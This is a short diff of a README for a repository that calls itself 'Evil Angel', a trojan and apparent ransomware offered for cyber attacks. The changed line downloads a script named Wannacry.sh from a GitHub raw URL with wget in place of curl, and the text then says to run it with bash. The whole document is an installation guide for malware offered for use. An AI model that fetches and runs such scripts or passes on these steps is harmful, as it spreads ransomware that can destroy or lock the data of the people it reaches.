@@ -3,7 +3,7 @@ Evil Angel is A Trojan Malware You Can User Evil Angel For Cyber Attacks or Reve
 
 # Installation
 
-curl https://raw.githubusercontent.com/HAXOR-BD1/Evil-Angel-Ransomware/main/Wannacry.sh
+wget https://raw.githubusercontent.com/HAXOR-BD1/Evil-Angel-Ransomware/main/Wannacry.sh
 
 Then Run "bash Wannacry.sh"
 
